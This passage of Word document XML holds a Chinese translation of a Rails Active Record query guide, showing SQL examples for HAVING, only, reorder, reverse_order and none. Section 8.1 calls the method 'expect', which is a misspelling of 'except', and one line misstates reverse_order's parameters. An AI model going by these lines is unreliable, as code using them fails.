      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="172C1C14" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4389C3DF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1965843889"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date(created_at) as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ordered_date, sum(price) as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>total_price FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders GROUP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date(created_at) HAVING</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>sum(price) &gt; 100</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="123DEB7B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会为每天返回一个 order 对象，但是仅限于那些一天订单总额大于 $100 的日子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7F9AB5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>8 覆盖条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765F0777" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>expect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AE47DB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>expect</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来忽略一些特定的条件表达式。比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7656"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="558C6AC2" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57077E7D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="674379808"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.where('id &gt; 10').limit(20).order('id asc').expect(:order)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="06E87D28" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">类似于如下的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 将会被执行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5039"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="09A9DDD4" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2016117E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1881088471"/>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posts WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id &gt; 10 LIMIT 20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54AFB354" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737F88E3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你还可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法来覆盖一些条件表达式。比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8496"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="40493CBD" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7EB35177" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="671564499"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.where('id &gt; 10').limit(20).order('id desc').only(:order, :where)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54ABF7E6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会生成如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5854"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3C9DDA40" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64521934" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1227455095"/>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posts WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id &gt; 10 ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id DESC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0ECA947B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reorder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CAEF440" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reorder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法会覆盖默认的排序方法。 比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6144"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="59B5DE33" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EDCEC41" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C604B82" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ..</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="453DA885" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ..</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6976DE8A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :comments, :order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'posted_at DESC'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10444760" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2672EF4A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2252B351" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.find(10).comments.reorder('name')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="311A3813" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会产生如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5494"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="72AD49EC" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55E5F9CE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="848981023"/>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posts WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id = 10 ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CF9C6C3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没有使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reorder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，那对应的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句就会变为：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6694"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7C3A445D" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="154B1390" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1402216457"/>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posts WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id = 10 ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posted_at DESC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="625DA7CF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFB8C23" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法会按照指定的排序方式倒序排列。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7416"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7466E5A9" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="763BEFAE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1911691368"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where("orders_count &gt; 10").order(:name).reverse_order</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A85838D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句将会执行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7461"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2EDEB368" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F147523" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1716730926"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders_count &gt; 10 ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>DESC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="309561A4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没有特别指定排序方式，那 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法会按照主键的倒序排列。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="525F4154" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DCFA7A4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1021933902"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where("orders_count &gt; 10").reverse_order</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B5A0C02" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它将会产生如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8254"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5856C64A" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="388B700F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="537661848"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders_count &gt; 10 ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.id DESC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1401F2BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这个方法还接受 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C9AE5A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>9 空实例对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393271EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>none</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法会返回一个代表没有记录的 relation 实例对象。随后的条件表达式会根据这个 relation 实例对象继续返回空的 relation 实例对象而不是空结果。这在你需要级联多个方法调用时非常有用。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
